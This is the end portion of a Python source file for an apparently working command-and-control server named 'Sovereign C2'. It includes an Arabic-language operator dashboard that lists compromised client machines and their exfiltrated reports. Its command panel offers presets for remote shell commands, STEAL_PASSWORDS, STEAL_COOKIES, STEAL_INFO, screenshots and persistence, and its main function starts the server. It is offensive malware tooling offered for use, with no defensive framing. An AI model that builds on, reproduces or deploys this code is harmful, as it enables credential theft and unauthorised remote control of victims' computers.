                <h1>🔮 Sovereign C2 Dashboard</h1>
                <p>نظام التحكم والقيادة - الإصدار 6.0</p>
                <div style="margin-top: 10px">
                    <button class="btn btn-primary" onclick="showCommandModal()">إصدار أمر</button>
                    <button class="btn btn-success" onclick="refreshData()">تحديث</button>
                    <button class="btn btn-danger" onclick="logout()">تسجيل خروج</button>
                </div>
            </div>
            
            <div class="stats-grid" id="stats">
                <div class="stat-card">
                    <div class="stat-value" id="total-clients">{stats['total_clients']}</div>
                    <div class="stat-label">إجمالي العملاء</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="active-clients">{stats['active_clients']}</div>
                    <div class="stat-label">نشط الآن</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="total-reports">{stats['total_reports']}</div>
                    <div class="stat-label">التقارير</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="total-data">{stats['total_data'] // 1024} KB</div>
                    <div class="stat-label">حجم البيانات</div>
                </div>
            </div>
            
            <div class="charts-grid">
                <div class="chart-container">
                    <canvas id="clientsChart"></canvas>
                </div>
                <div class="chart-container">
                    <canvas id="activityChart"></canvas>
                </div>
            </div>
            
            <div class="section">
                <div class="section-title">👥 العملاء النشطون</div>
                <table id="clients-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>الجهاز</th>
                            <th>المستخدم</th>
                            <th>IP</th>
                            <th>آخر ظهور</th>
                            <th>الحالة</th>
                            <th>إجراءات</th>
                        </tr>
                    </thead>
                    <tbody>
                        {"".join(f'''
                        <tr>
                            <td>{c['id'][:8]}...</td>
                            <td>{c.get('hostname', '-')}</td>
                            <td>{c.get('username', '-')}</td>
                            <td>{c.get('ip', '-')}</td>
                            <td>{c.get('last_seen', '-')}</td>
                            <td><span class="status-badge status-{'active' if c.get('status') == 'active' else 'inactive'}">{c.get('status', '-')}</span></td>
                            <td>
                                <button class="btn btn-primary btn-small" onclick="viewClient('{c['id']}')">عرض</button>
                                <button class="btn btn-success btn-small" onclick="commandClient('{c['id']}')">أمر</button>
                            </td>
                        </tr>
                        ''' for c in clients)}
                    </tbody>
                </table>
            </div>
            
            <div class="section">
                <div class="section-title">📊 آخر التقارير</div>
                <table id="reports-table">
                    <thead>
                        <tr>
                            <th>الوقت</th>
                            <th>العميل</th>
                            <th>النوع</th>
                            <th>الحجم</th>
                            <th>عرض</th>
                        </tr>
                    </thead>
                    <tbody>
                        {"".join(f'''
                        <tr>
                            <td>{r['timestamp']}</td>
                            <td>{r['client_id'][:8]}...</td>
                            <td>{r['type']}</td>
                            <td>{r['size']} bytes</td>
                            <td><button class="btn btn-primary btn-small" onclick="viewReport({r['id']})">عرض</button></td>
                        </tr>
                        ''' for r in reports)}
                    </tbody>
                </table>
            </div>
        </div>
        
        <!-- Modal for issuing commands -->
        <div id="commandModal" class="modal">
            <div class="modal-content">
                <span class="close" onclick="hideCommandModal()">&times;</span>
                <h3>إصدار أمر</h3>
                <form id="commandForm">
                    <label>العميل:</label>
                    <select id="commandClient" required>
                        <option value="">اختر عميلاً</option>
                        {"".join(f'<option value="{c["id"]}">{c.get("hostname", c["id"][:8])}</option>' for c in clients)}
                    </select>
                    
                    <label>الأمر:</label>
                    <select id="commandPreset" onchange="presetChanged()">
                        <option value="">أمر مخصص</option>
                        <option value="SHELL whoami">SHELL whoami</option>
                        <option value="SHELL ipconfig">SHELL ipconfig</option>
                        <option value="SHELL systeminfo">SHELL systeminfo</option>
                        <option value="STEAL_INFO">STEAL_INFO</option>
                        <option value="STEAL_PASSWORDS">STEAL_PASSWORDS</option>
                        <option value="STEAL_COOKIES">STEAL_COOKIES</option>
                        <option value="SCREENSHOT">SCREENSHOT</option>
                        <option value="PERSIST">PERSIST</option>
                        <option value="EXIT">EXIT</option>
                    </select>
                    
                    <textarea id="commandText" rows="3" placeholder="اكتب الأمر هنا..."></textarea>
                    
                    <button type="button" class="btn btn-primary" onclick="sendCommand()">إرسال الأمر</button>
                </form>
            </div>
        </div>
        
        <!-- Modal for viewing reports -->
        <div id="reportModal" class="modal">
            <div class="modal-content">
                <span class="close" onclick="hideReportModal()">&times;</span>
                <h3>محتوى التقرير</h3>
                <pre id="reportContent" style="white-space: pre-wrap; background: #f5f5f5; padding: 10px; border-radius: 5px; max-height: 400px; overflow: auto;"></pre>
            </div>
        </div>
        
        <!-- Notification -->
        <div id="notification" class="notification"></div>
        
        <script>
            const socket = io();
            
            // Charts
            let clientsChart, activityChart;
            
            function initCharts() {{
                // Clients chart
                const clientsCtx = document.getElementById('clientsChart').getContext('2d');
                clientsChart = new Chart(clientsCtx, {{
                    type: 'doughnut',
                    data: {{
                        labels: ['نشط', 'غير نشط'],
                        datasets: [{{
                            data: [{stats['active_clients']}, {stats['total_clients'] - stats['active_clients']}],
                            backgroundColor: ['#48bb78', '#e53e3e']
                        }}]
                    }},
                    options: {{
                        responsive: true,
                        plugins: {{
                            legend: {{ position: 'bottom' }},
                            title: {{ display: true, text: 'حالة العملاء' }}
                        }}
                    }}
                }});
                
                // Activity chart
                const activityCtx = document.getElementById('activityChart').getContext('2d');
                activityChart = new Chart(activityCtx, {{
                    type: 'line',
                    data: {{
                        labels: ['1س', '2س', '3س', '4س', '5س', '6س'],
                        datasets: [{{
                            label: 'التقارير',
                            data: [12, 19, 3, 5, 2, 3],
                            borderColor: '#667eea',
                            tension: 0.1
                        }}]
                    }},
                    options: {{
                        responsive: true,
                        plugins: {{
                            legend: {{ display: false }},
                            title: {{ display: true, text: 'نشاط آخر 6 ساعات' }}
                        }}
                    }}
                }});
            }}
            
            // WebSocket events
            socket.on('connect', function() {{
                showNotification('✅ متصل بالسيرفر');
            }});
            
            socket.on('new_report', function(data) {{
                showNotification(`📊 تقرير جديد من ${{data.client_id.substr(0,8)}}: ${{data.type}}`);
                refreshData();
            }});
            
            socket.on('client_update', function(data) {{
                showNotification(`👤 ${{data.type == 'new' ? 'عميل جديد' : 'تحديث عميل'}}: ${{data.client_id.substr(0,8)}}`);
                refreshData();
            }});
            
            socket.on('command_issued', function(data) {{
                showNotification(`📨 أمر صادر لـ ${{data.client_id.substr(0,8)}}`);
            }});
            
            socket.on('file_uploaded', function(data) {{
                showNotification(`📁 ملف جديد: ${{data.filename}}`);
            }});
            
            // Modal functions
            function showCommandModal() {{
                document.getElementById('commandModal').style.display = 'block';
            }}
            
            function hideCommandModal() {{
                document.getElementById('commandModal').style.display = 'none';
            }}
            
            function showReportModal() {{
                document.getElementById('reportModal').style.display = 'block';
            }}
            
            function hideReportModal() {{
                document.getElementById('reportModal').style.display = 'none';
            }}
            
            function presetChanged() {{
                const preset = document.getElementById('commandPreset').value;
                document.getElementById('commandText').value = preset;
            }}
            
            function sendCommand() {{
                const clientId = document.getElementById('commandClient').value;
                const command = document.getElementById('commandText').value;
                
                if (!clientId || !command) {{
                    alert('الرجاء اختيار عميل وإدخال أمر');
                    return;
                }}
                
                fetch('/api/command', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        client_id: clientId,
                        command: command
                    }})
                }})
                .then(response => response.json())
                .then(data => {{
                    if (data.status === 'success') {{
                        showNotification('✅ تم إرسال الأمر بنجاح');
                        hideCommandModal();
                    }} else {{
                        showNotification('❌ فشل إرسال الأمر');
                    }}
                }});
            }}
            
            function viewReport(reportId) {{
                // TODO: Fetch report content
                showReportModal();
                document.getElementById('reportContent').innerText = 'جاري التحميل...';
            }}
            
            function viewClient(clientId) {{
                window.location.href = `/client/${{clientId}}`;
            }}
            
            function commandClient(clientId) {{
                document.getElementById('commandClient').value = clientId;
                showCommandModal();
            }}
            
            function refreshData() {{
                location.reload();
            }}
            
            function logout() {{
                fetch('/logout', {{ method: 'POST' }})
                .then(() => window.location.href = '/login');
            }}
            
            function showNotification(message) {{
                const notification = document.getElementById('notification');
                notification.style.display = 'block';
                notification.innerHTML = message;
                setTimeout(() => notification.style.display = 'none', 3000);
            }}
            
            window.onclick = function(event) {{
                if (event.target.classList.contains('modal')) {{
                    event.target.style.display = 'none';
                }}
            }}
            
            document.addEventListener('DOMContentLoaded', initCharts);
        </script>
    </body>
    </html>
    """
    return html

# =====================================================================
# Main Entry Point
# =====================================================================

def main():
    """نقطة الدخول الرئيسية"""
    parser = argparse.ArgumentParser(description="Sovereign C2 Server")
    parser.add_argument('--host', default=Config.HOST, help='Host to bind')
    parser.add_argument('--port', type=int, default=Config.PORT, help='Port to bind')
    parser.add_argument('--debug', action='store_true', help='Debug mode')
    parser.add_argument('--init-db', action='store_true', help='Initialize database only')
    
    args = parser.parse_args()
    
    if args.init_db:
        log.info("Initializing database...")
        db.init_db()
        log.success("Database initialized")
        return
    
    log.success(f"Sovereign C2 Server starting on {args.host}:{args.port}")
    log.info(f"Dashboard: http://{args.host}:{args.port}/dashboard")
    log.info(f"API: http://{args.host}:{args.port}/api/")
    
    try:
        socketio.run(app, host=args.host, port=args.port, debug=args.debug)
    except KeyboardInterrupt:
        log.info("Shutting down...")
    except Exception as e:
        log.error(f"Server error: {e}")

if __name__ == '__main__':
    main()
